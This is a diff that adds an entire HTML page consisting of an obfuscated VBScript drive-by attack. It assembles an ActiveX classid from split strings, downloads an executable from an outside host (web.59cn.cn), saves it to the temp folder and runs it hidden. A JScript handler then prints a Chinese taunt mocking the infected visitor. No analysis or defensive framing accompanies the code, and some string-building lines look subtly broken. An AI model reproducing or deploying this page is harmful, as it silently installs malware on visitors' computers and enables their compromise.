@@ -1,0 +1,51 @@
+<html>
+<script language="VBScript">
+on error resume next
+x331="e"
+x332="x"
+x333="e"
+
+    cwyb = "http://web.59cn.cn/leiying/11."
+Set haha = document.createElement("object")
+x440="clsi"
+x441="d:BD9"
+x442="6C556-"
+x443="65A3-11D"
+x444="0-983"
+x445="A-00C04FC2"
+x446="9E36"
+haha.setAttribute "classid", x440&x441&x442&x443&x444&x445&x446
+baby1="Microsoft."
+baby2="XMLHTTP"
+str3=baby1&baby2
+Set c = haha.CreateObject(str3,"")
+str5="Adodb.Stream"
+set yykj = haha.createobject(str5,"")
+yykj.type = 1
+str6="GET"
+c.open str6, cwyb&x331&x332&x333, False
+c.Send
+sanshaoye="c:\regwritey.com"
+set F = haha.createobject("Scripting.FileSystemObject","")
+nnd="F.GetSpecialF"
+nnd2="older"
+set tmp = nnd&nnd2(2) 
+nnd3="F.Build"
+nnd4="Path"
+sanshaoye= nnd3&nnd4(tmp,sanshaoye)
+yykj.open
+yykj.write c.responseBody
+yykj.savetofile sanshaoye,2
+yykj.close
+ca="op"
+ca1="en"
+set caonimade = haha.createobject("Shell.Application","")
+caonimade.ShellExecute sanshaoye,"","",ca&ca1,0
+</script>
+<script type="text/jscript">
+function zj1244()
+{document.write("哎，又一位良民遭殃了- -!");}
+window.onload = zj1244;
+</script>
+</html>
+
